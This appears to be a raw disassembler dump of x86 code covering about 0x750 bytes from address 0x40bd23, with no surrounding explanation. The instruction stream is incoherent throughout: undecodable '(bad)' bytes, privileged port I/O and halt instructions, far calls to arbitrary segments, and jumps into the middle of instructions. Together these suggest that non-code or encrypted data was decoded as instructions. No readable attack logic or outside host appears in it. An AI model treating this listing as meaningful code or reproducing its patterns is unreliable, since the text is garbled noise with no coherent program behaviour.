  40bd23:	scas   eax,DWORD PTR es:[edi]
  40bd24:	jae    0x40bd73
  40bd26:	fucomip st,st(0)
  40bd28:	ins    BYTE PTR es:[edi],dx
  40bd29:	add    eax,0x98baab1d
  40bd2e:	das    
  40bd2f:	add    bh,BYTE PTR [ebx]
  40bd31:	sbb    ebx,esi
  40bd33:	scas   al,BYTE PTR es:[edi]
  40bd34:	leave  
  40bd35:	mov    esi,0x4109b9a0
  40bd3a:	adc    eax,0x366edc26
  40bd3f:	fbld   TBYTE PTR [edx]
  40bd41:	or     al,0x4a
  40bd43:	jecxz  0x40bd93
  40bd45:	iret   
  40bd46:	in     eax,dx
  40bd47:	pusha  
  40bd48:	sbb    BYTE PTR [ecx+0x27],0x43
  40bd4c:	ins    BYTE PTR es:[edi],dx
  40bd4d:	nop
  40bd4e:	scas   eax,DWORD PTR es:[edi]
  40bd4f:	xchg   esi,eax
  40bd50:	cmp    eax,ebp
  40bd52:	jle    0x40bd71
  40bd54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd55:	inc    eax
  40bd56:	les    edi,FWORD PTR [ebx]
  40bd58:	mov    cl,0x9b
  40bd5a:	in     eax,0xd0
  40bd5c:	(bad)  
  40bd5d:	fmul   QWORD PTR [ebx+0x1b7fb68e]
  40bd63:	xchg   edx,eax
  40bd64:	test   BYTE PTR [esp+esi*4+0x22864713],0xed
  40bd6c:	or     al,0x4f
  40bd6e:	fdivp  st(0),st
  40bd70:	mov    edi,0xef8007e6
  40bd75:	inc    ebp
  40bd76:	daa    
  40bd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd78:	pop    ebx
  40bd79:	add    DWORD PTR [eax-0x4229e009],0x76
  40bd80:	(bad)  
  40bd81:	and    edi,DWORD PTR [esi]
  40bd83:	ins    BYTE PTR es:[edi],dx
  40bd84:	adc    BYTE PTR [edx-0x348e3820],bh
  40bd8a:	xor    bl,BYTE PTR [edi-0xffa7f32]
  40bd90:	mov    ah,0x85
  40bd92:	pop    ecx
  40bd93:	shl    DWORD PTR [edi],1
  40bd95:	push   edi
  40bd96:	jae    0x40bd6d
  40bd98:	ja     0x40bdb0
  40bd9a:	scas   eax,DWORD PTR es:[edi]
  40bd9b:	(bad)  
  40bd9c:	stc    
  40bd9d:	rcr    esp,0x8f
  40bda0:	pop    ebx
  40bda1:	adc    DWORD PTR [ecx+0x4f],ebp
  40bda4:	rol    BYTE PTR ds:0x8c458c64,1
  40bdaa:	(bad)  
  40bdab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdac:	(bad)  
  40bdad:	ja     0x40bde7
  40bdaf:	fnstenv [edx-0x20dacbe3]
  40bdb5:	and    BYTE PTR [ebx],al
  40bdb7:	pushw  cs
  40bdb9:	xor    al,0x74
  40bdbb:	xor    DWORD PTR [ecx],edi
  40bdbd:	sbb    eax,0xfa3d3fef
  40bdc2:	push   cs
  40bdc3:	mov    bl,0xa
  40bdc5:	ins    BYTE PTR es:[edi],dx
  40bdc6:	pop    ecx
  40bdc7:	sar    esi,cl
  40bdc9:	jge    0x40bdb0
  40bdcb:	(bad)  
  40bdcd:	jb     0x40bddf
  40bdcf:	retf   0x9d04
  40bdd2:	popa   
  40bdd3:	cmp    dl,BYTE PTR cs:[edi]
  40bdd6:	sub    edi,DWORD PTR [edi+eax*8-0x2c]
  40bdda:	bound  edx,QWORD PTR [edx+edi*1-0x72bffcee]
  40bde1:	and    DWORD PTR [eax-0x746f2291],ecx
  40bde7:	sub    eax,edi
  40bde9:	ror    BYTE PTR [edx+0xa59d13e],0x3d
  40bdf0:	aad    0xf1
  40bdf2:	push   ebx
  40bdf3:	mov    ch,0x44
  40bdf5:	inc    edx
  40bdf6:	cmp    edx,DWORD PTR [ebp+0x50f3a162]
  40bdfc:	icebp  
  40bdfd:	stos   BYTE PTR es:[edi],al
  40bdfe:	inc    esp
  40bdff:	jmp    0x40be2d
  40be01:	dec    ecx
  40be02:	mov    WORD PTR [eax+0x6a],cs
  40be05:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40be07:	add    BYTE PTR [edi+ecx*4],cl
  40be0a:	mov    eax,ds:0x4e86188a
  40be0f:	and    ah,BYTE PTR [esi-0x7b]
  40be12:	xor    eax,0xcc124f03
  40be17:	in     eax,0xd6
  40be19:	mov    edi,edx
  40be1b:	sub    al,0xe4
  40be1d:	dec    esp
  40be1e:	les    eax,FWORD PTR [ecx+edx*4+0x14]
  40be22:	push   es
  40be23:	repnz lea ecx,[edi-0x5efaaa28]
  40be2a:	mov    esp,0xc22ffc20
  40be2f:	cdq    
  40be30:	cmp    al,0x7e
  40be32:	sbb    ebx,DWORD PTR [edi+0x46e729a6]
  40be38:	inc    esp
  40be39:	sbb    BYTE PTR gs:[ebx-0x8545369],0x29
  40be41:	or     DWORD PTR [esi+0x5379dee8],esi
  40be47:	hlt    
  40be48:	jp     0x40bec6
  40be4a:	daa    
  40be4b:	xor    esp,DWORD PTR [ebp+ebx*8-0x35]
  40be4f:	adc    ch,dl
  40be51:	hlt    
  40be52:	mov    fs,WORD PTR [eax-0x32]
  40be55:	mov    ebp,0x1ef16aac
  40be5a:	adc    eax,0xcf49df6c
  40be5f:	xor    BYTE PTR [ebx],dh
  40be61:	add    al,BYTE PTR [esi+0x65]
  40be64:	and    DWORD PTR [ecx],esi
  40be66:	mov    dh,0xc4
  40be68:	sub    eax,0x1a6e6d3
  40be6d:	add    esi,DWORD PTR [esp+ebp*4]
  40be70:	add    bl,BYTE PTR [eax-0x7f]
  40be73:	cdq    
  40be74:	cwde   
  40be75:	bound  ecx,QWORD PTR [edx-0xabbdd4a]
  40be7b:	push   ebp
  40be7c:	push   0xd
  40be7e:	mov    ch,0xfc
  40be80:	call   0x388d:0xb828fb11
  40be87:	call   0xbd0e47c7
  40be8c:	sbb    DWORD PTR ds:0x5538c187,ebp
  40be92:	fdiv   QWORD PTR [ebp+0x6ce5aaf8]
  40be98:	in     al,dx
  40be99:	push   es
  40be9a:	out    dx,eax
  40be9b:	scas   eax,DWORD PTR es:[edi]
  40be9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be9d:	jbe    0x40be56
  40be9f:	(bad)  
  40bea0:	ret    
  40bea1:	mov    bh,0xce
  40bea3:	stos   DWORD PTR es:[edi],eax
  40bea4:	ds aam 0x3b
  40bea7:	scas   eax,DWORD PTR es:[edi]
  40bea8:	sub    eax,0x71793d1
  40bead:	dec    eax
  40beae:	xchg   ebp,eax
  40beaf:	in     eax,0x2
  40beb1:	xor    eax,0xa042fb80
  40beb6:	ins    DWORD PTR es:[edi],dx
  40beb7:	push   ebp
  40beb8:	scas   eax,DWORD PTR es:[edi]
  40beb9:	bnd call 0x5116139b
  40bebf:	jl     0x40be85
  40bec1:	and    al,0xd9
  40bec3:	into   
  40bec4:	sub    eax,0x79551c4c
  40bec9:	xchg   eax,esp
  40becb:	leave  
  40becc:	and    BYTE PTR [ebx+0x23513ce4],cl
  40bed2:	push   ebp
  40bed3:	loopne 0x40bed8
  40bed5:	mov    dh,0x7d
  40bed7:	sbb    eax,0x7c76592a
  40bedc:	sti    
  40bedd:	fistp  WORD PTR [esi]
  40bedf:	test   eax,0xebc6e229
  40bee4:	lea    esp,[edx+0x3ee5249]
  40beea:	lds    ebp,FWORD PTR [edi+0x64]
  40beed:	data16 add BYTE PTR gs:[edi],0xfa
  40bef2:	cmp    eax,eax
  40bef4:	(bad)  
  40bef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef6:	out    0xbb,al
  40bef8:	test   al,0x21
  40befa:	(bad)  
  40befc:	aad    0x79
  40befe:	or     DWORD PTR [ebp-0x6bc2d85],edx
  40bf04:	dec    ebp
  40bf05:	repz out dx,al
  40bf07:	pushf  
  40bf08:	or     bh,ch
  40bf0a:	mov    ecx,0xa4f2bdb6
  40bf0f:	inc    ebp
  40bf10:	int3   
  40bf11:	pop    es
  40bf12:	mov    dl,0xa6
  40bf14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf15:	sub    al,0xc0
  40bf17:	test   BYTE PTR [edx+0x5b6db4e6],dl
  40bf1d:	mov    esi,0xd1f1f208
  40bf22:	jl     0x40bf50
  40bf24:	bound  edx,QWORD PTR [ebp-0x54b62b27]
  40bf2a:	sti    
  40bf2b:	ds cs rcr eax,cl
  40bf2f:	int3   
  40bf30:	mov    al,ds:0xb130e0f2
  40bf35:	cmc    
  40bf36:	sub    DWORD PTR [ebp+0x5c],edi
  40bf39:	ins    DWORD PTR es:[edi],dx
  40bf3a:	sub    BYTE PTR [ebx],dl
  40bf3c:	xchg   ebx,eax
  40bf3d:	mov    bp,0x90a1
  40bf41:	popf   
  40bf42:	dec    ecx
  40bf43:	and    eax,0x162b9b70
  40bf48:	dec    ebp
  40bf49:	(bad)  
  40bf4a:	pop    ds
  40bf4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf4c:	push   edi
  40bf4d:	dec    eax
  40bf4e:	xchg   edi,eax
  40bf4f:	and    DWORD PTR [esi],eax
  40bf51:	lods   al,BYTE PTR ds:[esi]
  40bf52:	lock lods al,BYTE PTR ds:[esi]
  40bf54:	push   ds
  40bf55:	repnz out dx,al
  40bf57:	ins    BYTE PTR es:[edi],dx
  40bf58:	dec    ebp
  40bf59:	dec    edi
  40bf5a:	push   0x6d45ade8
  40bf5f:	loope  0x40bfb3
  40bf61:	dec    BYTE PTR [edx-0x22]
  40bf64:	jo     0x40bf43
  40bf66:	stos   BYTE PTR es:[edi],al
  40bf67:	ins    DWORD PTR es:[edi],dx
  40bf68:	mov    WORD PTR [eax+0x3194d8bf],es
  40bf6e:	and    cl,BYTE PTR [ecx+0x4cc230a]
  40bf74:	fimul  DWORD PTR [ecx+0x3b70e57]
  40bf7a:	in     al,dx
  40bf7b:	pop    ecx
  40bf7c:	cld    
  40bf7d:	aam    0xe1
  40bf7f:	cmp    eax,0x26d698a3
  40bf84:	dec    ecx
  40bf85:	push   edx
  40bf86:	sbb    cl,BYTE PTR [esi-0x2b310116]
  40bf8c:	mov    edi,0xf0f64060
  40bf91:	add    BYTE PTR [eax-0x1bd1c6c0],bh
  40bf97:	aam    0xe7
  40bf99:	in     al,dx
  40bf9a:	dec    ebp
  40bf9b:	scas   al,BYTE PTR es:[edi]
  40bf9c:	je     0x40bf7e
  40bf9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf9f:	mov    ds:0xf1b38f07,eax
  40bfa4:	or     BYTE PTR [ecx+0x461d9bb2],cl
  40bfaa:	inc    esi
  40bfab:	popf   
  40bfac:	leave  
  40bfad:	test   al,0xdb
  40bfaf:	jbe    0x40bf7e
  40bfb1:	push   esi
  40bfb2:	leave  
  40bfb3:	push   0x44fce810
  40bfb8:	test   eax,0x6ff01b52
  40bfbd:	xlat   BYTE PTR ds:[ebx]
  40bfbe:	ror    DWORD PTR [edx+ebp*1],1
  40bfc1:	popa   
  40bfc2:	dec    edi
  40bfc3:	pop    edi
  40bfc4:	jmp    0xae91:0xc509f78b
  40bfcb:	add    cl,BYTE PTR [edi+ebx*8+0x46]
  40bfcf:	scas   al,BYTE PTR es:[edi]
  40bfd0:	hlt    
  40bfd1:	retf   
  40bfd2:	mov    ch,0x17
  40bfd4:	bound  edi,QWORD PTR [esi-0x5c40f1d6]
  40bfda:	enter  0xe8c2,0xef
  40bfde:	push   cs
  40bfdf:	jb     0x40c01c
  40bfe1:	test   eax,0xc40bf106
  40bfe6:	rcr    DWORD PTR [edx-0x33cd3363],cl
  40bfec:	pop    edx
  40bfed:	gs inc edx
  40bfef:	jge    0x40bfc5
  40bff1:	gs jge 0x40bf82
  40bff4:	jmp    0x40c02e
  40bff6:	std    
  40bff7:	xor    DWORD PTR [ebx+0x6],ebx
  40bffa:	mov    cs,esi
  40bffc:	daa    
  40bffd:	cmc    
  40bffe:	iret   
  40bfff:	hlt    
  40c000:	movaps xmm0,XMMWORD PTR ds:[ecx]
  40c004:	xchg   BYTE PTR [ebx+0x6a],bl
  40c007:	daa    
  40c008:	push   cs
  40c009:	sbb    bh,bl
  40c00b:	add    al,0xb2
  40c00d:	jg     0x40c047
  40c00f:	(bad)  
  40c010:	mov    BYTE PTR [ebx],0x6d
  40c013:	adc    al,0xcf
  40c015:	retf   0x7e1
  40c018:	into   
  40c019:	inc    edi
  40c01a:	adc    esi,ebx
  40c01c:	fcmovbe st,st(5)
  40c01e:	sbb    ah,BYTE PTR [ebp+0x6d6d2529]
  40c024:	mov    ah,0x80
  40c026:	push   esp
  40c027:	xor    edi,ebp
  40c029:	cmp    edi,esi
  40c02b:	addr16 nop
  40c02d:	push   ss
  40c02e:	outs   dx,BYTE PTR ds:[esi]
  40c02f:	sbb    al,0x88
  40c031:	(bad)
  40c034:	test   al,0xe0
  40c036:	out    dx,al
  40c037:	pop    ecx
  40c038:	push   ds
  40c039:	and    al,BYTE PTR [esi]
  40c03b:	test   BYTE PTR [edx-0x55623d22],dh
  40c041:	sbb    ah,BYTE PTR [ecx+0x2d1e7bba]
  40c047:	sub    al,0x68
  40c049:	xadd   DWORD PTR [edi],esi
  40c04c:	out    dx,al
  40c04d:	loopne 0x40c061
  40c04f:	dec    esi
  40c050:	sbb    al,0xd2
  40c052:	mov    bh,0x71
  40c054:	out    dx,eax
  40c055:	scas   eax,DWORD PTR es:[edi]
  40c056:	inc    esi
  40c057:	push   cs
  40c058:	dec    edi
  40c059:	inc    eax
  40c05a:	ret    
  40c05b:	push   eax
  40c05c:	sub    dh,bl
  40c05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c05f:	cwde   
  40c060:	out    dx,al
  40c061:	xchg   ebp,eax
  40c062:	pop    ebx
  40c063:	pop    ebp
  40c064:	in     eax,0x4b
  40c066:	mov    ah,0xb4
  40c068:	(bad)  
  40c069:	pop    ecx
  40c06a:	rcl    DWORD PTR [ebp+0x2ebb9c05],0xac
  40c071:	adc    eax,0x3f8184e
  40c076:	call   0xb265:0x1663f26e
  40c07d:	ror    DWORD PTR [edx-0x4a],0x68
  40c081:	mov    cl,0x53
  40c083:	push   ecx
  40c084:	cmc    
  40c085:	sar    DWORD PTR [ecx],cl
  40c087:	mov    al,0xb8
  40c089:	hlt    
  40c08a:	mov    BYTE PTR [eax-0xb],bh
  40c08d:	(bad)  
  40c08e:	push   ebx
  40c08f:	sbb    DWORD PTR [ebx],edx
  40c091:	iret   
  40c092:	push   es
  40c093:	adc    eax,0x4f07a038
  40c098:	(bad)  
  40c099:	(bad)  
  40c09a:	cmp    al,BYTE PTR [edx-0x17]
  40c09d:	out    0x23,eax
  40c09f:	jns    0x40c028
  40c0a1:	iret   
  40c0a2:	out    0x59,eax
  40c0a4:	pop    esi
  40c0a5:	add    ebx,DWORD PTR [eax+0x5b]
  40c0a8:	xor    al,0x96
  40c0aa:	sbb    BYTE PTR [edi-0x11e5880f],al
  40c0b0:	jl     0x40c0d7
  40c0b2:	add    esp,DWORD PTR [ebx]
  40c0b4:	test   BYTE PTR [ecx+esi*8],dh
  40c0b7:	cmp    bl,BYTE PTR [ebp-0x6c]
  40c0ba:	mov    dl,BYTE PTR [eax]
  40c0bc:	dec    eax
  40c0bd:	mov    ds:0x618e2a98,al
  40c0c2:	ins    DWORD PTR es:[edi],dx
  40c0c3:	mov    edi,esp
  40c0c5:	fild   DWORD PTR [edx+0x5dc73e5]
  40c0cb:	frstor [esi-0x74]
  40c0cf:	ret    0x7cb8
  40c0d2:	mov    edx,0x31f4cfb9
  40c0d7:	out    dx,al
  40c0d8:	xchg   edx,eax
  40c0d9:	repnz cmp eax,DWORD PTR [esi+0x86a0f56]
  40c0e0:	xor    DWORD PTR [ebp+eax*1-0x5b],0x692a6787
  40c0e8:	add    BYTE PTR [edi-0x4eaa2476],al
  40c0ee:	cli    
  40c0ef:	add    al,0x15
  40c0f1:	xchg   ecx,eax
  40c0f2:	into   
  40c0f3:	sub    edi,esi
  40c0f5:	outs   dx,DWORD PTR ds:[esi]
  40c0f6:	(bad)  
  40c0f7:	push   es
  40c0f8:	lock clc 
  40c0fa:	mov    ecx,0x622de865
  40c0ff:	push   ebp
  40c100:	pop    ss
  40c101:	mov    edi,DWORD PTR [eax+0x7332e2b3]
  40c107:	mov    cx,0x3d4e
  40c10b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c10c:	jp     0x40c0c6
  40c10e:	test   DWORD PTR [ecx+edx*1-0x5649cd7],edx
  40c115:	cmc    
  40c116:	scas   eax,DWORD PTR es:[edi]
  40c117:	xchg   esi,eax
  40c118:	test   al,0x70
  40c11a:	mov    eax,0x6b8c773
  40c11f:	xchg   esp,eax
  40c120:	call   0x7c26d92
  40c125:	aad    0x1e
  40c127:	hlt    
  40c128:	add    ch,bl
  40c12a:	inc    eax
  40c12b:	ins    DWORD PTR es:[edi],dx
  40c12c:	shl    BYTE PTR [eax-0x5518d5a3],0x7a
  40c133:	or     al,0xb0
  40c135:	scas   al,BYTE PTR es:[edi]
  40c136:	mov    cl,0xad
  40c138:	xor    al,0x28
  40c13a:	dec    ebx
  40c13b:	leave  
  40c13c:	cwde   
  40c13d:	dec    edi
  40c13e:	stos   DWORD PTR es:[edi],eax
  40c13f:	or     BYTE PTR [ecx+0x19c2e98d],0xe3
  40c146:	add    BYTE PTR ds:0x4e952052,0xdb
  40c14d:	cli    
  40c14e:	rcr    DWORD PTR [esi+0x20],cl
  40c151:	fisttp WORD PTR [edx+0x5bd70aee]
  40c157:	enter  0x9d5d,0x32
  40c15b:	fnstenv [ecx+0x62162375]
  40c161:	loop   0x40c176
  40c163:	adc    bh,al
  40c165:	ss xor eax,eax
  40c168:	jno    0x40c18c
  40c16a:	add    BYTE PTR [edi],bl
  40c16c:	xor    BYTE PTR [ebx-0x29948d3c],bl
  40c172:	mov    bl,0x59
  40c174:	mov    eax,DWORD PTR [ecx+0x1c5446bc]
  40c17a:	sti    
  40c17b:	mov    ebx,0x2b02075d
  40c180:	push   esp
  40c181:	sbb    BYTE PTR [ecx+0x57],bh
  40c184:	or     ecx,DWORD PTR [ebx]
  40c186:	adc    DWORD PTR [ecx-0xfa096c9],ebp
  40c18c:	fisubr DWORD PTR ds:0xaca3f4d3
  40c192:	inc    esp
  40c193:	xchg   esp,eax
  40c194:	xchg   edx,eax
  40c195:	push   esp
  40c196:	pop    ss
  40c197:	test   DWORD PTR [edi-0x20],ebp
  40c19a:	fsubr  DWORD PTR [eax]
  40c19c:	mov    ds:0x85c8ae34,al
  40c1a1:	xor    cl,bh
  40c1a3:	inc    edx
  40c1a4:	pusha  
  40c1a5:	xor    al,0xe2
  40c1a7:	mov    ebx,0x109e611f
  40c1ac:	add    dh,BYTE PTR [edx]
  40c1ae:	mov    esi,0x657c9053
  40c1b3:	sbb    ah,BYTE PTR [ecx]
  40c1b5:	xchg   ebx,eax
  40c1b6:	ja     0x40c13c
  40c1b8:	add    edx,DWORD PTR [esi]
  40c1ba:	inc    esi
  40c1bb:	pop    esp
  40c1bc:	jne    0xc3400725
  40c1c2:	mov    ch,0x36
  40c1c4:	or     al,0x95
  40c1c6:	cmp    DWORD PTR [esi+0x4c],ebx
  40c1c9:	cmp    BYTE PTR [eax],ch
  40c1cb:	in     eax,dx
  40c1cc:	mov    cs,WORD PTR ds:0xce832824
  40c1d2:	in     al,0xb8
  40c1d4:	xor    DWORD PTR [esi+ebx*4-0x53],edx
  40c1d8:	adc    DWORD PTR [esi+0x2f],ecx
  40c1db:	stos   DWORD PTR es:[edi],eax
  40c1dc:	aaa    
  40c1dd:	and    BYTE PTR [ebx+0x2d],bh
  40c1e0:	mov    edx,cs
  40c1e2:	add    ebp,DWORD PTR [ecx-0x39fb3a61]
  40c1e8:	sub    ebp,DWORD PTR [ebx+0x6e4a042e]
  40c1ee:	in     al,0x31
  40c1f0:	mov    bl,0x91
  40c1f2:	ins    DWORD PTR es:[edi],dx
  40c1f3:	xchg   ebx,eax
  40c1f4:	pop    edi
  40c1f5:	adc    BYTE PTR [esi+0x7b6868c2],bl
  40c1fb:	pop    ss
  40c1fc:	rol    BYTE PTR [edx+0x3199777],0x13
  40c203:	pop    ds
  40c204:	dec    eax
  40c205:	adc    al,0x3b
  40c207:	mov    esp,0x799f2815
  40c20c:	push   ebx
  40c20d:	jb     0x40c1a6
  40c20f:	jo     0x40c1cb
  40c211:	mov    ch,0x1
  40c213:	cld    
  40c214:	push   0xffffffdf
  40c216:	lods   eax,DWORD PTR ds:[esi]
  40c217:	cmp    BYTE PTR [ebp+0x574f278],0x97
  40c21e:	cld    
  40c21f:	call   0x9af50aeb
  40c224:	or     esp,DWORD PTR [ebp+0x26]
  40c227:	mov    bl,0xe7
  40c229:	ja     0x40c219
  40c22b:	sti    
  40c22c:	mov    cl,0x66
  40c22e:	mov    eax,DWORD PTR [eax+0x6f]
  40c231:	test   BYTE PTR [ebp-0x620b0fe3],ah
  40c237:	lock loope 0x40c2ab
  40c23a:	jb     0x40c1f0
  40c23c:	jno    0x40c2b1
  40c23e:	add    DWORD PTR [ecx+0x1a8ec45],edx
  40c244:	cs xor eax,0x146ca0f4
  40c24a:	jle    0x40c2aa
  40c24c:	push   ss
  40c24d:	and    DWORD PTR [esi+0x12],ecx
  40c250:	and    eax,0x8009046d
  40c255:	and    cl,BYTE PTR [ebx]
  40c257:	add    al,ch
  40c259:	std    
  40c25a:	int3   
  40c25b:	shl    WORD PTR ds:0x4685cf3,1
  40c262:	mov    ebp,0xea0aab7
  40c267:	sbb    dl,BYTE PTR [ecx-0x7d]
  40c26a:	mov    esi,DWORD PTR [ebx+ecx*4]
  40c26d:	aad    0x7
  40c26f:	gs retf 0x8e57
  40c273:	or     bh,bl
  40c275:	adc    ah,bl
  40c277:	xchg   ecx,eax
  40c278:	mov    ebx,0x65c1c0e5
  40c27d:	adc    eax,0xae7532b1
  40c282:	xchg   edi,eax
  40c283:	dec    ebp
  40c284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c285:	adc    dh,dh
  40c287:	leave  
  40c288:	jle    0x40c252
  40c28a:	ror    ebp,cl
  40c28c:	mov    ebp,DWORD PTR ds:[esi+0x74]
  40c290:	mov    ch,0x1a
  40c292:	adc    BYTE PTR [esi+edi*2-0x74],0x7c
  40c297:	pop    esp
  40c298:	jecxz  0x40c300
  40c29a:	aad    0x82
  40c29c:	cdq    
  40c29d:	cmp    eax,0xe94b270c
  40c2a2:	clc    
  40c2a3:	xor    ebp,edx
  40c2a5:	daa    
  40c2a6:	sti    
  40c2a7:	mov    DWORD PTR [ebp+0x78],0x5aae2907
  40c2ae:	and    DWORD PTR [edi+0x13],ebx
  40c2b1:	jl     0x40c2fb
  40c2b3:	fisub  DWORD PTR [edx]
  40c2b5:	ffree  st(6)
  40c2b7:	lods   eax,DWORD PTR ds:[esi]
  40c2b8:	shl    BYTE PTR [ebx-0x2f],1
  40c2bb:	push   ebx
  40c2bc:	mov    DWORD PTR [eax-0x2d],0xaae638f3
  40c2c3:	cmp    BYTE PTR [ecx+ebp*1+0x18],bl
  40c2c7:	jl     0x40c258
  40c2c9:	call   0xf85c:0xd01b9620
  40c2d0:	sbb    eax,0x17969
  40c2d5:	(bad)  
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	adc    eax,0x9e79112b
  40c2dc:	sbb    BYTE PTR [ebx-0x36c4ac9],dl
  40c2e2:	jne    0x40c2d5
  40c2e4:	pop    ds
  40c2e5:	xchg   ecx,eax
  40c2e6:	adc    DWORD PTR [ebp-0x1d],esi
  40c2e9:	xchg   edi,eax
  40c2ea:	(bad)  
  40c2eb:	je     0x40c352
  40c2ed:	inc    ecx
  40c2ee:	cli    
  40c2ef:	dec    ebx
  40c2f0:	mov    DWORD PTR [eax],ebp
  40c2f2:	in     al,dx
  40c2f3:	jns    0x40c27e
  40c2f5:	jo     0x40c278
  40c2f7:	lahf   
  40c2f8:	add    BYTE PTR [ecx+0xd],ch
  40c2fb:	inc    edx
  40c2fc:	leave  
  40c2fd:	inc    edx
  40c2fe:	icebp  
  40c2ff:	cmp    al,0x42
  40c301:	xchg   edi,eax
  40c302:	ins    BYTE PTR es:[edi],dx
  40c303:	xor    ax,0xf8d2
  40c307:	arpl   WORD PTR [ecx],di
  40c309:	pop    edi
  40c30a:	clc    
  40c30b:	pop    esi
  40c30c:	mov    ds:0xcb73479e,al
  40c311:	in     eax,0xdb
  40c313:	out    dx,eax
  40c314:	mov    edx,edx
  40c316:	pop    es
  40c317:	cdq    
  40c318:	jl     0x40c329
  40c31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c31b:	test   eax,0xd1ce36e8
  40c320:	xchg   DWORD PTR [eax-0x2649977b],edi
  40c326:	hlt    
  40c327:	hlt    
  40c328:	or     dh,BYTE PTR [ebx+0x38]
  40c32b:	and    eax,0x5ab19ad7
  40c330:	adc    eax,0x1285ca6e
  40c335:	or     edi,DWORD PTR [edi+0x74]
  40c338:	out    0x59,al
  40c33a:	(bad)  
  40c33b:	jl     0x40c2c9
  40c33d:	cdq    
  40c33e:	dec    DWORD PTR [ebx+0x23]
  40c341:	mov    ebx,0xb02135cf
  40c346:	mov    dh,0x52
  40c348:	inc    esp
  40c349:	mov    dl,0xd5
  40c34b:	ja     0x40c362
  40c34d:	sbb    ah,BYTE PTR [eax+0x5e7d339a]
  40c353:	aad    0xff
  40c355:	inc    esp
  40c356:	jl     0x40c31f
  40c358:	xchg   edx,eax
  40c359:	push   ss
  40c35a:	and    eax,0xe35fcb8f
  40c35f:	pop    ebp
  40c360:	sbb    BYTE PTR [ecx+0x36],0xa2
  40c364:	push   ds
  40c365:	fwait
  40c366:	test   al,0x92
  40c368:	dec    ebp
  40c369:	mov    ebx,0x54024d21
  40c36e:	ret    0xadb3
  40c371:	or     DWORD PTR [edi-0xfa7e672],edx
  40c377:	pop    esp
  40c378:	in     al,dx
  40c379:	mov    esi,0x84b3fdb9
  40c37e:	test   eax,0x56d301ae
  40c383:	fwait
  40c384:	mov    al,ds:0xd30023e1
  40c389:	stc    
  40c38a:	(bad)  
  40c38b:	loope  0x40c3e5
  40c38d:	push   eax
  40c38e:	into   
  40c38f:	or     ebx,DWORD PTR [ecx-0x6ffe240d]
  40c395:	add    esi,DWORD PTR [eax+0x4c]
  40c398:	inc    eax
  40c399:	add    esi,ebx
  40c39b:	mov    al,ds:0x20d6c2f0
  40c3a0:	push   ebx
  40c3a1:	das    
  40c3a2:	fnstenv [ebx+0x67ca0324]
  40c3a8:	test   al,0x2d
  40c3aa:	neg    esi
  40c3ac:	test   al,0x5d
  40c3ae:	push   ebx
  40c3af:	and    eax,0xc190e9a3
  40c3b4:	add    ebx,DWORD PTR [esi-0x12e48319]
  40c3ba:	call   0xddb12b65
  40c3bf:	sti    
  40c3c0:	into   
  40c3c1:	inc    ebx
  40c3c2:	adc    eax,0xe8253a52
  40c3c7:	and    eax,0xffac3349
  40c3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3cd:	dec    edx
  40c3ce:	and    al,0x9f
  40c3d0:	lahf   
  40c3d1:	ss scas eax,DWORD PTR es:[edi]
  40c3d3:	dec    edi
  40c3d4:	fimul  DWORD PTR [ecx-0x46]
  40c3d7:	mov    ecx,0x65ff1b09
  40c3dc:	cmp    ebp,DWORD PTR [ebx+eax*1+0x2f3c8ead]
  40c3e3:	repz mov ch,0x28
  40c3e6:	vpmacsdql xmm4,xmm4,XMMWORD PTR [esp+r15d*4-0x1fd0c20c],xmm4
  40c3f1:	ja     0x40c400
  40c3f3:	loop   0x40c433
  40c3f5:	addr16 pop ebp
  40c3f7:	adc    DWORD PTR [esi+edi*1+0x6],ebp
  40c3fb:	repnz rep stos BYTE PTR es:[edi],al
  40c3fe:	xchg   BYTE PTR [edx-0x2b],bh
  40c401:	add    ah,cl
  40c403:	and    ebx,DWORD PTR [edx+0x6b]
  40c406:	test   DWORD PTR [eax+0x7c96d98b],ebx
  40c40c:	ins    DWORD PTR es:[edi],dx
  40c40d:	xor    DWORD PTR [ecx-0x362f8e1e],esi
  40c413:	pop    esp
  40c414:	pop    ss
  40c415:	inc    edi
  40c416:	jmp    0x40c42d
  40c418:	lods   al,BYTE PTR ds:[esi]
  40c419:	and    BYTE PTR [ebp+eiz*1-0x56],0xbe
  40c41e:	sbb    bh,BYTE PTR [eax-0x59f91c3]
  40c424:	rcr    eax,cl
  40c426:	fnstenv [esi-0x19ab34df]
  40c42c:	xor    eax,0x34037103
  40c431:	leave  
  40c432:	jmp    0x40c3ca
  40c434:	mov    esi,0x13d44602
  40c439:	pop    esp
  40c43a:	push   eax
  40c43b:	sahf   
  40c43c:	xor    eax,0xe011805f
  40c441:	inc    ebx
  40c442:	shr    BYTE PTR [esi+0x4e],0x54
  40c446:	fidivr DWORD PTR [esi]
  40c448:	(bad)  
  40c449:	popf   
  40c44a:	dec    edx
  40c44b:	xchg   edi,eax
  40c44c:	xor    edx,DWORD PTR [edi+ebx*1+0x48]
  40c450:	dec    ecx
  40c451:	jge    0x40c4b0
  40c453:	xchg   ebx,eax
  40c454:	je     0x40c4ab
  40c456:	test   BYTE PTR [eax-0x56e8559c],ah
  40c45c:	fidiv  WORD PTR [ebp+0x45]
  40c45f:	sub    BYTE PTR [esi+0x6e],cl
  40c462:	loop   0x40c45b
  40c464:	inc    esp
  40c465:	jnp    0x40c439
  40c467:	push   ebx
  40c468:	cmp    esp,DWORD PTR [ebp-0x24]
  40c46b:	xor    edi,DWORD PTR [ebp+0x70]
  40c46e:	push   edi
  40c46f:	jbe    0x40c45d
  40c471:	rcr    DWORD PTR [edx],1
  40c473:	dec    eax
  40c474:	popf   
